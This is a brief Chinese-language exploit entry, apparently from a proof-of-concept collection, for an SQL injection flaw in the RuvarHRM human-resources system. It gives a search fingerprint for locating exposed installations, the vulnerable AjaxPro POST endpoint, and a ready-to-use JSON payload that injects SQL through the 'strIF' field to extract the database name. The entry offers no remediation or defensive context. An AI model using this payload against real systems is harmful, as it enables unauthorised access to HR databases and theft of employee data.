# 璐华RuvarHRM存在SQL注入漏洞

璐华 ｜ SQL注入 ｜ —
- **指纹**：`title="RuvarHRM"`
- **请求**：`POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1`

**Payload**
```
{"strIF":"1=1) and 1=db_name()--","deptPv":"0","strUserType":"all"}
```
- **响应特征**：200